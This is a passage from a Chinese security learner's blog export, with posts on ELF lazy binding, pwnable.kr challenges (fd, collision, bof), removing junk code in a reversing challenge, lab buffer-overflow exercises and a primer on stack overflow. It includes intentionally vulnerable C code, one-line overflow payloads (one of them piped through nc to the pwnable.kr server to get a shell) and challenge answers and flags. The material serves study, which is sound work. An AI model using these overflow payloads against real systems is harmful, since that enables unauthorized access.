于是我们先在调用这个函数前，也就是0x804871f处下一个断点，运行，然后在plt0的第一条指令处下断点，继续运行： 在运行后我们会发现0x804a008处存放着我们要找的绑定函数的地址0xb7ff24f0，然后我们单步运行进入这个函数，进过多次的调试，我发现这个函数就是_dl_runtime_reslove函数，然后我们再想想运行会发现真正去修改GOT表的fixup函数： 然后在调用完这些函数后，我们会发现got.plt表中该函数对应地址发生了变化，这也就是完成了相应的函数绑定。 我们再回头验证一下，从下面的这张图可以看到如果直接步入该函数，它直接就跳到函数对应的真实地址，发现他就是我们上面得到的0xb7f5556，get it，这样就完成了函数的延迟绑定。 0x03 最后的絮叨我一开始做到plt0那之前没啥问题，但是做到那，然后在0x804a008找下一个调用地址的时候卡住了，困扰好久，后来看到一篇文章才解决。再后来我在进到_dl_runtime_slove函数的时候，试着去反编译出来，达到下面的效果： 但是并没有实现，于是一直怀疑自己哪错了，后来为了大佬才解决，原来是因为libc版本不一样对应的汇编指令不一样，顿悟，失声。。。。。。。。]]></content>
      <tags>
        <tag>elf文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable学习笔记 第一更]]></title>
    <url>%2F2017%2F03%2F12%2Fpwnable%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E6%9B%B4%2F</url>
    <content type="text"><![CDATA[pwnable学习笔记 第一更 这个学习pwn基础的练习网站是在我组长分享给我们的，感觉开始应该还是比较简单的，因此想写点自己学习过程中的一些经验和问题，以供以后回顾，深入学习 0x00 fd（Linux文件标识符） 个人感觉第一题还是比较简单的，主要考察的就是fd这个Linux文件标识符以及read()和atoi()这两个函数。fd是Linux的文件标识符，fd=0是为标准输入，fd=1时为标准输出，fd=2时标准输出错误；read()函数就是简单的赋值传送函数，将第一个参数fd所指的文件传送nbyte到buf指针所指的内存中（该函数的一般形态是：read(fd,buf,n)）；atoi (表示 alphanumeric to integer)是把字符串转换成整型数的一个函数。 下面就是实际的操作： 先是ls出所有文件，在cat出fd.c中如下的源码：1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&amp;lt2) &#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf)) &#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 经过一番分析，也就是将数组argv的数减去0x1234剩下的与原有的字符串对比，相同则获得bin权限，否则不能获得权限，那就先加上0x1234对应的十进制的4660，然后在输入相应的字符串即可，操作如下即可。 0x01 collision（碰撞） 第二题其实跟第一题差不多的感觉。从题目的如下代码可见，需要输入20个字符，被分为五段，每段当成int型处理，对其进行相加与0x21DD09EC对比，相同则获得bin权限，否则失败。123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&amp;lt;5; i++) &#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&amp;lt;2) &#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20) &#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] )) &#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 那么我们就可使用python脚本对其操作，具体的操作如下： 0x02 bof 这是第三题，终于感觉跟之前学的那些缓冲区溢出还有米神的一步一步学rop有点瓜葛了。这里给出了程序及其源码，分析源码可以知道是gets()函数出了问题，可以进行利用其进行溢出修改key来拿到bin权限； 具体的分析就是这个函数中先是调用一个gets()函数，然后是再验证key的值是否是0xcafebabe来判断是否能让我们获取其中的的bin权限，但是下面的main函数已经定义了可以是0xdeadbeef，因此我们就需要溢出 overflowme这个数组来修改可以的值借以达到通过验证获取bin权限的目的，这样的话，获取数组和key在内存中所占空间大小就成了关键之处，而数组则是通过gets()函数来进入程序的，而且这里只有gets()函数和printf()函数可以缓冲区溢出，printf不可能，剩下的之有它了，这里我们可以使用ida帮助我们分析； 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe) &#123; system("/bin/sh"); &#125; else &#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 先使用ida查看一下，发现main函数有可疑之处； 进去一瞅，发现gets()函数的参数s也就是数组的起始地址之ebp-2ch，而a1也就是key是ebp+8h，这样一算，需要输入0x2c+0x8=52个字符才能造成溢出，修改key值，进而获得bin权限；再进行python脚本的构造就行了（很尴尬，脚本是抄的但是我也去查了其中一些命令的含义），构造出的python命令是： (python -c ‘print(“a”*52+ chr(0xbe) + chr(0xba) + chr(0xfe) +chr(0xca))’; cat) | nc pwnable.kr 9000其中几个chr()的内容可以使用”/xbe/xba/xfe/xca”表示，nc是链接远端的命令，这里需要注意的是使用的cat的目的是显示出flag，缺少是不行的；]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reserve系列题目浅析（一）]]></title>
    <url>%2F2017%2F02%2F04%2FReserve%E7%B3%BB%E5%88%97%E9%A2%98%E7%9B%AE%E6%B5%85%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 花指令(Junk code)的介绍 所谓花指令，人如其名，它就是一些混淆人们视线的指令，一般就是混在正常指令，正常运行时是永远不会运行到的代码块，但是当你去反汇编它是，因为反编译器不会是判断，会导致反编译出来的代码永远不正确，进而使得反汇编过程不能够如期进行。例如如下的程序中： #include &lt;iostream.h&gt; #include &lt;windows.h&gt; void main() { _asm { jmp l2 _EMIT 0x1//这里就是花指令 _EMIT 0x2//这里就是花指令 _EMIT 0x3//这里就是花指令 _EMIT 0x4//这里就是花指令 l2: mov eax,0x11111111 } } 反编译器在反编译的时候不会像我们人一样去理解jmp和l2之间的指令是永远不会执行到的，所以在反编译的时候就把这段乱七八糟的代码作为正常的指令了，而这样的反编译会影响mov eax,0x11111111这个指令的正确识别，所以导致在OD中以上代码不会正确显示。 0x01 花指令的设置 设置花指令有两种方式，一是使用jmp指令，另外一个就是使用call指令配合ret指令。 使用jmp指令的方法不用多说了，上面的示例程序就是能很好地说明了，这里就着重介绍一下第二种方法。因为call指令相当于是两个指令，先将自身所在位置的下一条指令的地址压入栈中，然后再跳转到call函数执行的地方，而ret则是跳转到已经压入堆栈的地址，使之往下运行。这样的话就能使用这两条指令组合来完成jmp指令的目的。 下面介绍一下具体的加花指令的流程： （1） 先是call一个地址，然后在里面写一些无用的垃圾汇编代码，但是要记得所写的代码的字节数； （2） 再者就是在call里面的一些设置，先是pop出压入的地址，把这个地址减去刚刚代码字节数再push进堆栈里然后就是ret就好了还有推荐一篇尝试自己手动加花指令的文章，可以去看看，链接如下： http://www.pediy.com/kssd/pediy09/pediy09-324.htm 0x02 如何去除花指令 既然都知道花指令的原理了，那当然需要知道如何才能去除他咯，毕竟我们要不仅要能够运行一个程序，还要去reserve它。 去除花指令也有两种方式，一种是手动的去除，另一种是使用工具。手动肯定是费时费力的活，但是感觉还是有必要去学习的，毕竟不是什么地方都有工具来供我们使用的。而手动去除花指令的方法也是多种多样，这里就分享一个别人的小技巧：当发现jmp或者call的地址在OD中没显示的话，就把jmp或者call指令的下一个指令nop掉吧，肯定是花指令，如果还没有显示的话就继续nop下一条，直到显示的指令和执行的指令一致。然后使用工具的话，就是对应的一些插件，使用就不多说了。 0x03 实力搞一波事情（其实是看了别人的writeup） 下面就来用事实说话。首先是测试程序，然后侦壳，使用peid和die都没发现，但是却在使用OD调试时发现还是有壳的，看人家的writeup上用的一个ExeinfoPe的软件能查出壳，但是也看不出是什么壳。既然知道有壳，就脱吧，这并不是什么难的壳，简单的单步跟踪或者堆栈平衡都行，找到OEP使用OllyDump脱了就好。 下面就是花指令的事了，使用ODA查看了发现有好多处，如下： 然后先定位到判断函数然后对相关函数去花，先是在MessageBoxW处下断，但是并没有在这里断下。再是就是CreatThread，下断，输入伪码回车，断在这了。在0x4044FF下断跟进线程函数sub_4044FF，发现只是call了一个函数，地址是0x403894，跟进发现花指令，这里的大概分为两种： （1）这里使用了CLC指令之后，用JNB指令跳转到0x4038A8,所以在0x4038A7处nop掉即可。这是第一种花指令，使用的较多。 （2）这种是在函数4038D8里（下一行）对esp进行重新计算，并通过RETN返回真确的地址。如上，返回的正确地址为4038DCE。所以只需将4038DD处改为0x90(nop)即可。这一片去完就能看到sub_403894函数了。 上面就是去除花指令的过程，下面的就是简单地一个算法，经过分析得到flag是：codebywidesoft。]]></content>
      <tags>
        <tag>Reaserve</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[合天实验室《pwn基础练习》学习总结]]></title>
    <url>%2F2017%2F01%2F20%2F%E5%90%88%E5%A4%A9%E5%AE%9E%E9%AA%8C%E5%AE%A4%E3%80%8Apwn%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 pwn基础练习 这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。 0x01 缓冲区溢出攻击的基本操作 这个部分主要就是就是一些基础中的基础，比如说是汇编的基础和python的基础了解，然后就是对于gdb这个工具的使用吧。 下面就来看看具体的分析流程： 首先是cat到源码进行分析（源码如下），可以看到gets()函数有可能会引发缓冲区溢出，因为gets()函数读取数据时不会对内容缓冲区的长度进行检查，而如果输入超出缓冲区长度就会发生溢出。 源码如下： #include int main(int argc, char** argv) { int modified; char buffer[64]; modified = 0; gets(buffer); // 引发缓冲区溢出 if (modified != 0) { printf("Congratulations, you pwned it.\n"); } else { printf("Please try again.\n"); } return 0; } 然后是用gdb反汇编得到汇编代码进行分析，下面是对main函数中的汇编代码的解释： 0x080482a0 : push %ebp 0x080482a1 : mov %esp,%ebp 0x080482a3 : and $0xfffffff0,%esp esp = esp - 0x60，即在栈上分配0x60）字节的空间 0x080482a6 : sub $0x60,%esp modified变量位于esp + 0x5C处，将其初始化为0 0x080482a9 : movl $0x0,0x5c(%esp) buffer位于esp + 0x1C处 0x080482b1 : lea 0x1c(%esp),%eax 0x080482b5 : mov %eax,(%esp) 调用gets(buffer)读取输入数据 0x080482b8 : call 0x8049360 判断modified变量的值是否是0 0x080482bd : cmpl $0x0,0x5c(%esp) 如果modified的值等于0，就跳转到 0x080482d2 0x080482c2 : je 0x80482d2 modified不为0，打印成功提示 0x080482c4 : movl $0x80b3eec,(%esp) 0x080482cb : call 0x8049500 0x080482d0 : jmp 0x80482de modified为0，打印失败提示 0x080482d2 : movl $0x80b3f0b,(%esp) 0x080482d9 : call 0x8049500 0x080482de : mov $0x0,%eax 0x080482e3 : leave 0x080482e4 : ret 看到上面的源码和汇编代码，程序的大概流程应该就清楚了，从中我们得知buffer在esp+0x1C处，而modified在esp+0x5C处，这两个地址之间隔着刚好六十四，也就是buffer数组的大小。因此，modified也就是从第六十五位输入的的数据开始，而在这个程序中只要是使得modified的值不为0就行，那也就是说只要第六十五个输入的对应ASCII值不为零就好了，事实也就是这样的。我们还可以直接使用python命令pwn掉程序：python -c “print ‘A’*64+’B’” | ./pwn1，这样更能体验到pwn的乐趣，但这也是前面大量工作的铺垫。 最后挖一个坑，实验里面的成功提示信息的地址是从何得来的，有时间再仔细的过一遍吧。 0x02 精确覆盖变量数据 这个感觉跟第一课时的差别不是很大，这个课时的示例程序是一个带有两个参数的main函数，两个参数方分别是参数的个数argc另一个argv则是指向一个具体存储参数内容的字符串数组。感觉这个程序和上一个的区别在于，上一个是一个，随便溢出都行，这个则是需要计算出需要溢出的长度和内容。而这里呢就涉及到一个大端小段存储的知识点，这是两种不同的存储方式，我们只需记得小端存储就是高位数据存在高地址，低位数据存在低地址。 经过和第一课时相同的分析过程，得出这个程序正常运行是不会跳转到成功信息的，需要的是对溢出的信息控制为0x61626364。也和上一课时一样，buffer位于esp+0x1C处，而modified位于esp+0x5C处，他们相差64，所以得溢出四位数据来，先用1234来测试发现其是使用的小端存储，于是控制溢出信息为\x64\x63\x62\x61，这样的话使用python就能一步解决了：python -c “print ‘A’*64+’dcba’” | xargs ./pwn2（xargs是Linux中的一个命令，它可以将输入数据当做命令行参数传给指定的程序） 0x03 环境变量继承 第三课时的环境变量的继承就有点难度了，虽说跟前面的差不多的分析过程但是首先得懂得环境变量继承的原理。 所谓程序运行的环境也就是一个外部条件，或者说他运行时的外部的样子，同时，跟子承父业一样当一个父进程启动一个子进程时，这个子进程会继承父进程的环境变量。在上一课时的main函数里还可以有个参数，它是指向另一个数组的，这个数组存储的是具体的环境变量参数，而在这个示例程序中是使用了buffer通过strcpy()函数模拟子进程继承父进程的环境变量值variable，而modified则是需要控制的溢出值，同上的分析过程，结果也同上，需要控制的溢出内容是添加一个六十八位的数据（后四位按要求来）来作为新的环境变量。 而这个步骤却可以有两种不同的方式来解决，一种是按部就班的使用Linux语句命令来进行运行。另一种则是使用python脚本来实现，也就是事先编辑好了一串命令，来运行直接达到你的目的。具体的脚本参见附件。 0x04 函数指针改写 这个函数指针的改写，我觉得跟前面的一样，就是改变了一下形式，这里是要溢出覆盖的是一串地址，也就是相当于是修改一个函数的入口地址，是这个程序按照你的意思来运行，借以达到目的。 这里面涉及到了objdump这个工具的使用，之前也稍微接触过，如果说gdb是Linux的OD，那它就是Linux的ida（差不多，但感觉不如ida强大），也就是倚天屠龙的关系。这个工具可以静态调试程序，查看每个功能函数的汇编。 这个示例程序是先设一个函数指针，然后使用gets()函数来获取他，这样只用上面的分析然后进行溢出控制，是的函数指针的值变为win()函数的入口地址就好了，而函数的入口地址使用objdump查看就好了。这样也是很容易就pwn掉了它。 0x05 溢出攻击的总结 通过这几个课时的学习，也差不多了解了其中的原理。首先我们得找出溢出点，还得知道溢出长度，这样才能去编写shellcode来攻击它，得到我们想要的结果。]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆栈结构浅析]]></title>
    <url>%2F2016%2F12%2F20%2F%E5%A0%86%E6%A0%88%E7%BB%93%E6%9E%84%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 堆栈结构 堆和栈是一种计算机科学中常用的抽象数据类型，虽说都是数据存储结构，但是却是两种不同的结构。 0x01 数据结构和内存空间中对堆栈不同理解 内存空间中： 一般的，系统会划分出两种不同的内存空间，也就是堆和栈。 在这其中，栈是有结构的，每个区块按照一定的次序存放，可以明确知道每个区块的大小和地址。而堆则不是这样的，它没有结构，数据时随意存放的，杂乱无章。因而寻址速度当然是栈的快，使用栈的效率也是很快的。还有一方面就是，一般的话，每个线程分配一个栈，每个进程分配一个堆，也就是一个栈对应一个线程，一个堆对应好几个线程。由上面的这些特性决定的是一般局部变量和一些空间确定的数据存放于栈中，其余的都存放在堆里。 数据结构中： 在数据结构中，栈就是一种存储数据的结构而已，特点是FILO，也就是先进后出。栈的结构就像是一个箱子，先来的数据被压入是肯定是在箱底，后来的肯定是在上层的，这样一来，当需要出去的时候只能上面的先出，箱底的后出，这样就是先进后出了。 而堆在数据结构中就是一种特殊的完全二叉树，也叫优先队列。特点就是所有的父节点的值大于或小于两个子节点的值，分别称为大顶堆和小顶堆。 0x02 栈溢出 栈溢出就是缓冲区溢出的一种。栈溢出就是想缓冲区写入超过缓冲区本身长度的数据，让缓冲区无法容纳以致缓冲区以外的存储单元被改写。缓冲区长度一般与用户自己定义的缓冲变量的类型有关。 栈溢出可以将原来栈中的数据覆盖，或者将恶意代码插入到栈帧数据中，并以此达到自己的特殊目的。 0x03 栈溢出攻击 一般攻击是在远程通过网络实施栈溢出攻击，攻击报文通过网络找到特定的服务器主机，并且在服务器主机进行函数调用时进行恶意破坏行为。典型的为以下的三种：修改相邻数据，修改函数的返回值和修改SEH。 代码如下： int vulnerable_func(char * input) { int isSafe = 0; char vulnerable_var[16]; strcpy(vulnerable_var,input); if(isSafe == 0) { printf("Check error!\n"); return 1; } printf("Check Pass!\n"); return 0; } int main(int argc,char* argv[]) { vulnerable_func("Hello World!\n"); vulnerable_func("Hello World!AAAAAAAAAAAAAAA"); return 0; } （1）修改相邻数据 若以上代码是服务器的安全模块的一部分，输入的是用户信息，isSafe是服务器中存放的判断用户的关键数据，就可以利用栈溢出来修改isSafe变量，从而造成一次非法用户绕过安全检查的成功入侵，但这种情况很少出现。 （2）修改函数返回值 相较于前一种方式，这是一种更常见的攻击。若当输入的数据够大，就足以覆盖函数的返回地址，再者的话如果输入精心构造的shellcode，就能够精确地修改函数返回地址，使得程序直接就跳到shellcode中去执行其中的函数，这样也就是可以获得进程对应的权限进行远程植入自己想要执行的函数，达到破坏或者利用目的。 （3）修改SEH（Structured Exception Handling） 其实这还是一种修改函数返回地址的方式，先使用溢出导致函数出错，调用异常处理函数，接着就可再利用溢出来覆盖异常处理函数的地址直接跳转到shellcode里面运行，进而达到自己目的。由于比较高效，它也成为栈溢出的经典攻击方法。 0x04 栈溢出的防护 主要是有两个方面：一个是在编写程序的时候就进行提示，进行及时的预防，如微软在vs系列中添加栈溢出检查的编译选项；二是进行防御，在操作系统下增加一些安全机制进行防御，如Windows系统中添加了SEHOP来阻止攻击者通过修改SEH来利用漏洞。]]></content>
      <tags>
        <tag>堆栈结构</tag>
      </tags>
  </entry>
</search>
